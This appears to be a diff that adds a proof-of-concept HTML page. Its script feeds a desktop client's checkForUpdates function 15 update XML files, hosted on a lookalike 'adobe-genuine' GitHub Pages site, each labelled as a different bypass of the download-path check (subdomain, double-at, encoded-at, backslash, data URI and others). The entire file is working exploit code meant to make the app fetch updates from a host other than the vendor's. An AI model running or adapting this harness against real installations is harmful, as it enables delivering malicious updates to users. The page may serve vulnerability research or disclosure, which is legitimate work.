@@ -1,0 +1,38 @@
+<html><body>
+<div id="o"></div>
+<script>
+var o = document.getElementById('o');
+function log(m) { o.innerHTML += m + '<br>'; }
+
+// All test XML URLs - each has different DownloadPath bypass
+var tests = [
+    ['path-contains', 'xml/t01.xml'],
+    ['subdomain', 'xml/t02.xml'],
+    ['double-slash', 'xml/t03.xml'],
+    ['fragment', 'xml/t04.xml'],
+    ['query-param', 'xml/t05.xml'],
+    ['dot-segment', 'xml/t06.xml'],
+    ['mixed-case', 'xml/t07.xml'],
+    ['unicode-dot', 'xml/t08.xml'],
+    ['tab-in-url', 'xml/t09.xml'],
+    ['empty-userinfo', 'xml/t10.xml'],
+    ['double-at', 'xml/t11.xml'],
+    ['url-encoded-at', 'xml/t12.xml'],
+    ['backslash-path', 'xml/t13.xml'],
+    ['redirect-legit', 'xml/t14.xml'],
+    ['data-uri', 'xml/t15.xml'],
+];
+
+var i = 0;
+function next() {
+    if (i >= tests.length) { log('ALL 15 TESTS DONE'); return; }
+    var name = tests[i][0];
+    var url = 'https://adobe-genuine.github.io/connect-poc/' + tests[i][1] + '?nc=' + Date.now();
+    log((i+1) + '. ' + name);
+    try { connectApp.checkForUpdates(url, false, true); } catch(e) { log('  ERR: '+e.message); }
+    i++;
+    setTimeout(next, 2000);
+}
+next();
+</script>
+</body></html>
